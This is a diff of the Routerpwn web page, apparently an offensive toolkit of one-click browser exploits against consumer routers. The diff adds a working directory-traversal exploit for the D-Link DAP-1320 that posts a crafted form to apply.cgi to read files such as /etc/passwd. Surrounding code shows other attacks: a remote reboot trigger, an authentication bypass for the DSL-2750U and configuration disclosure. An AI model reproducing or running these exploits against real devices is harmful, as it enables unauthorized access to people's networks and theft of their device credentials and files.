@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.15.222</title>
+		<title>Routerpwn 1.15.223</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -225,14 +225,37 @@ function hg866passr() {
 	document.hg866pass.action="http://"+ip+"/html/password.html";
 	document.hg866pass.submit();
 }
+// D-Link DAP-1320 Wireless Range Extender - Directory Traversal.html
+	function dap1320_dirtraversal(ip)
+	{
 
-function hg866dosr() {
-	ip=prompt("IP:");
-	document.hg866dos.action="http://"+ip+"/html/admin_reboot.html";
-	if (ip==null || ip==""){}else{
-		document.hg866dos.submit();
+		ip = ip || "dlinkap.local";
+		path = prompt("Path: (ex: /etc/passwd)");
+		
+
+		var form = '<input type="hidden"	name="submit_type" value="nas_admin"/>\
+		<input	type="hidden"	name="next_page"	value="%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F' + encodeURI(path) + '"/>\
+		<input	type="hidden"	name="login_name"	value=""/>\
+		<input	type="hidden"	name="html_response_message" value="just_login"/>\
+		<input	type="hidden"	name="log_pass"	value=""/>\
+		<input	type="hidden"	name="login_n"	value="admin"/>\
+		<input	type="hidden"	name="action"	value="do_graph_auth"/>\
+		<input	type="hidden"	name="tmp_log_pass"	value="PAN"/>\
+		<input	type="hidden"	name="tmp_log_pass_auth"	value="FRIED"/>\
+		<input	type="hidden"	name="graph_code"	value="0DEY"/>\
+		<input	type="hidden"	name="session_id"	value="57687"/>\
+		<input	type="hidden"	name="gcode_base64"	value="8TEHPOO%3D"/>\</form>';
+		
+		post('http://' + ip + '/apply.cgi', form);
+		
 	}
-}
+	function hg866dosr() {
+		ip=prompt("IP:");
+		document.hg866dos.action="http://"+ip+"/html/admin_reboot.html";
+		if (ip==null || ip==""){}else{
+			document.hg866dos.submit();
+		}
+	}
 
 function rtn16_passdisclosure(ip)
 {
@@ -334,12 +357,12 @@ function dwl2100ap_configdisclosure(ip)
     document.location="http://"+ip+"/cgi-bin/Intruders.cfg";
 }
 
-// D-Link DSL-2750U - Bypass Auth
-function dsl2750u_bypassauth(ip)
-{
-    ip = ip || "192.168.1.1";
-    document.location="http://"+ip+"/html/config";
-}
+	// D-Link DSL-2750U - Bypass Auth
+	function dsl2750u_bypassauth(ip)
+	{
+	    ip = ip || "192.168.1.1";
+	    document.location="http://"+ip+"/html/config";
+	}
 
 // D-Link DIR-615 D3 - Change Admin Password CSRF
 function d615d3_changepass(ip)
@@ -2879,6 +2902,14 @@ a=a+1
 <h3><a href="javascript:img('D-Link DWL 2100AP')">D-Link DAP 1150</a>, <a href="javascript:img('D-Link DWL 2100AP')">DWL 2100AP</a>, <a href="javascript:img('704P')">704P</a>, <a href="javascript:img('DIR-615')">DIR-615</a>, <a href="javascript:img('DSL-500T')">DSL-500T</a>, <a href="javascript:img('DSL-502T')">DSL-502T</a>, <a href="javascript:img('DSL-504T')">DSL-504T</a>, <a href="javascript:img('DSL-562T')">DSL-562T</a>, <a href="javascript:img('DSL-G604T')">DSL-G604T</a>, <a href="javascript:img('DWL-7000AP')">DWL-7000AP</a>, <a href="javascript:img('DWL-7100AP')">DWL-7100AP</a>, <a href="javascript:img('DNS-320')">DNS-320</a>, <a href="javascript:img('DNS-325')">DNS-325</a>, <a href="javascript:img('DSL-2750U')">DSL-2750U</a>, <a href="javascript:img('DWL-2100AP')">DWL-2100AP</a>, <a href="javascript:img('DIR-280')">DIR-280</a>, <a href="javascript:img('DSL-2740B')">DSL-2740B</a>, <a href="javascript:img('DIR-300')">DIR-300</a></h3>
 
 <article>
+        <div>04/17/14</div>
+        <div><a href="http://packetstormsecurity.com/files/126219/dlinkdap1320-traversalxss.txt">[+]</a></div>
+        <div><a href="javascript:dap1320_dirtraversal()">D-Link DAP-1320 Wireless Range Extender - Directory Traversal.html</a></div>
+        <div><a href="javascript:dap1320_dirtraversal(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+
+<article>
 	<div>01/15/14</div>
 	<div><a href="http://1337day.com/exploit/8713">[+]</a></div>
 	<div><a href="javascript:dwl2100ap_configdisclosure()">DWL-2100AP - Configuration Disclosure</a></div>
@@ -2942,7 +2973,7 @@ a=a+1
 	<div><a href="javascript:dsl320b_configdisclosure(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
 
-<article>
+	<article>
 	<div>04/22/13</div>
 	<div><a href="http://www.s3cur1ty.de/m1adv2013-014">[+]</a></div>
 	<div><a href="javascript:dir300615_commandexec()">D-Link DIR-300 - Remote Command Execution</a></div>
